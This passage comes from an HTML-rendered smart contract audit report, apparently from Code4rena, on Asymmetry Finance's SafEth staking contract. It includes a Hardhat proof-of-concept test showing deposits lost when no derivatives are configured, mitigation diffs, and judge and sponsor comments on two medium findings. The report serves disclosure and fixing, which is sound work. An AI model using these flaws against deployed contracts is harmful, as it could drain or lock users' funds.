class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;stake tests&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">adminAccount</span><span class=\"mtk1\">: </span><span class=\"mtk10\">SignerWithAddress</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">safEthProxy</span><span class=\"mtk1\">: </span><span class=\"mtk10\">SafEth</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;200&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">before</span><span class=\"mtk1\">(</span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">latestBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBlock</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;latest&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">request</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">method:</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;hardhat_reset&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params:</span><span class=\"mtk1\"> [{</span><span class=\"mtk12\">forking:</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">jsonRpcUrl:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">process</span><span class=\"mtk1\">.</span><span class=\"mtk12\">env</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MAINNET_URL</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">blockNumber:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">latestBlock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }}],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">accounts</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getSigners</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">adminAccount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">safEthProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">upgrades</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployProxy</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractFactory</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SafEth&quot;</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;Asymmetry Finance ETH&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;safETH&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk15\">as</span><span class=\"mtk1\"> </span><span class=\"mtk10\">SafEth</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">safEthProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;PoC: don&#39;t have derivatives&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check: don&#39;t have derivatives</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">safEthProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">derivativeCount</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// This transaction should revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">safEthProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stake</span><span class=\"mtk1\">({ </span><span class=\"mtk12\">value:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethBal</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safEthProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakerBal</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">safEthProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">adminAccount</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// This log 200 ether, but should be 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;safEthProxy Balance:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethBal</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toString</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The staker has 0 tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;staker Balance:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stakerBal</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toString</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When stake the <code>derivativeCount</code> should be greater than <code>0</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -</span><span class=\"mtk7\">64</span><span class=\"mtk1\">,</span><span class=\"mtk7\">6</span><span class=\"mtk1\"> +</span><span class=\"mtk7\">64</span><span class=\"mtk1\">,</span><span class=\"mtk7\">7</span><span class=\"mtk1\"> @@ </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SafEth</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pauseStaking</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;staking is paused&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">minAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;amount too low&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">maxAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;amount too high&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;derivativeCount is zero&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/363#issuecomment-1500615415\">toshiSat (Asymmetry) confirmed, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Seems like low severity to me.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/363#issuecomment-1518071069\">Picodes (judge) decreased severity to Medium</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Check derivativeCount on stake.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Incorrectly mitigated. Full details in reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/54\">adriro</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/38\">d3e4</a> - and also shared below in the <a href=\"#mitigation-review\">Mitigation Review</a> section.</p>\n<hr>\n<h2 id=\"m-11-residual-eth-unreachable-and-unutilized-in-safethsol\" style=\"position:relative;\"><a href=\"#m-11-residual-eth-unreachable-and-unutilized-in-safethsol\" aria-label=\"m 11 residual eth unreachable and unutilized in safethsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/152\">[M-11] Residual ETH unreachable and unutilized in SafEth.sol</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/152\">RaymondFam</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1149\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1033\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/935\">n33k</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/877\">LeoGold</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/835\">Phantasmagoria</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/734\">eyexploit</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/695\">neumo</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/671\">yac</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/486\">jasonxiale</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/455\">juancito</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/397\">adeolu</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/333\">anodaram</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/286\">mojito_auditor</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/252\">aviggiano</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/146\">7siech</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/84\">koxuan</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/64\">chaduke</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/14\">SunSec</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L246\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L246</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L124-L127\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L124-L127</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L138-L155\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L138-L155</a></p>\n<p>Unlike the other three contracts in scope, SafEth.sol does not have a measure in place to utilize the residual ETH, be it:</p>\n<ul>\n<li>accidentally received,</li>\n<li>zero ETH output from <code>unstake()</code> arising from recipient non-contract existence, or</li>\n<li>ETH sent in via <code>stake()</code> fails to deposit into a derivative due to uninitialized derivatives and weights, as I have explained in a separate submission.</li>\n</ul>\n<p>In the derivative contracts, the above issue is wiped clean via <code>address(this).balance</code> every time <code>withdraw()</code> is predominantly invoked in <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L118\"><code>unstake()</code></a> of SafEth.sol:</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/WstEth.sol#L63-L66\">File: WstEth.sol#L63-L66</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L84-L87\">File: SfrxEth.sol#L84-L87</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L110-L114\">File: Reth.sol#L110-L114</a><br></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"soildity\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        (bool sent, ) = address(msg.sender).call{value: address(this).balance}(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            &quot;&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(sent, &quot;Failed to send Ether&quot;);</span></span></code></pre>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>As in SafETH.sol, <code>ethAmountBefore</code> and <code>ethAmountAfter</code> are used to determine <code>ethAmountToWithdraw</code> or <code>ethAmountToRebalance</code> respectively in <code>untake()</code> and <code>rebalanceToWeights()</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol\">File: SafEth.sol</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmountBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmountAfter</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmountToWithdraw</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ethAmountAfter</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">ethAmountBefore</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmountBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmountAfter</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmountToRebalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ethAmountAfter</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">ethAmountBefore</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider having <code>rebalanceToWeights()</code> refactored as follows:</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L138-L155\">File: SafEth.sol#L138-L155</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function rebalanceToWeights() external onlyOwner {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 ethAmountBefore = address(this).balance;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        for (uint i = 0; i &lt; derivativeCount; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            if (derivatives[i].balance() &gt; 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                derivatives[i].withdraw(derivatives[i].balance());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 ethAmountAfter = address(this).balance;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 ethAmountToRebalance = ethAmountAfter - ethAmountBefore;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 ethAmountToRebalance = address(this).balance;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        for (uint i = 0; i &lt; derivativeCount; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            if (weights[i] == 0 || ethAmountToRebalance == 0) continue;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            uint256 ethAmount = (ethAmountToRebalance * weights[i]) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                totalWeight;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // Price will change due to slippage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            derivatives[i].deposit{value: ethAmount}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        emit Rebalanced();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>This will at least have the residual ETH harnessed and distributed to all existing stakers whenever <code>rebalanceToWeights()</code> is called.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/455#issuecomment-1500603245\">toshiSat (Asymmetry) disputed via duplicate issue <code>#455</code></a></strong></p>\n<p><strong><a 